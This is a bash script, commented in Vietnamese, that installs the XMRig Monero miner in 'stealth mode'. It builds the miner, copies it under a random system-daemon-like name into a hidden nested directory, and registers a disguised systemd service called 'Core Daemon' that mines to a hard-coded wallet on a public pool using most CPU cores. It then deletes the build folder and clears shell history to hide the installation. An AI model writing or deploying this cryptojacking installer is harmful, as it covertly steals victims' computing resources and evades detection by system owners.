#!/bin/bash

# ========== CONFIG ==========
WALLET="47jKLNTu7MHZzbyfnhEZV4PHXe7z8CzpU6WV6hukLPthYnzmtXRWDFUYaa3pdM9xMnQxwsHCnw1zXBkVaNeUGRVkUc7VXoL"
WORKER="silent_$(hostname)"
POOL="pool.supportxmr.com:443"
TOTAL_CORES=$(nproc)
CPU_THREADS=$(awk "BEGIN {print int($TOTAL_CORES * 0.7)}")
PRIORITY=3
CUSTOM_NAME=$(shuf -n1 -e "dbusd" "syscore" "logworker" "udevd")
INSTALL_DIR="$HOME/.local/.share/.cache/.dbus"
SERVICE_NAME=$(shuf -n1 -e "logrotate" "system-fix" "netcore" "kernel-agent")
# ============================

echo "💻 Đang cài đặt XMRig stealth-mode..."

# Cài thư viện cần thiết
sudo apt update
sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev curl

# Clone và build XMRig
cd ~
rm -rf xmrig
git clone https://github.com/xmrig/xmrig.git
cd xmrig
mkdir build && cd build
cmake .. -DCMAKE_BUILD_TYPE=Release
make -j$TOTAL_CORES

# Tạo thư mục ẩn và copy binary
mkdir -p "$INSTALL_DIR"
cp ./xmrig "$INSTALL_DIR/$CUSTOM_NAME"
chmod +x "$INSTALL_DIR/$CUSTOM_NAME"

# Tạo systemd service giả mạo
sudo tee /etc/systemd/system/$SERVICE_NAME.service > /dev/null << EOF
[Unit]
Description=Core Daemon
After=network.target

[Service]
ExecStart=$INSTALL_DIR/$CUSTOM_NAME -o $POOL -u $WALLET.$WORKER -k --coin monero \
  --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0 --max-cpu-usage=65
Restart=always
Nice=10

[Install]
WantedBy=multi-user.target
EOF

# Kích hoạt service
sudo systemctl daemon-reload
sudo systemctl enable $SERVICE_NAME
sudo systemctl start $SERVICE_NAME

# Xóa dấu vết cài đặt
cd ~
rm -rf xmrig
history -c

echo ""
echo "✅ XMRig stealth đã chạy!"
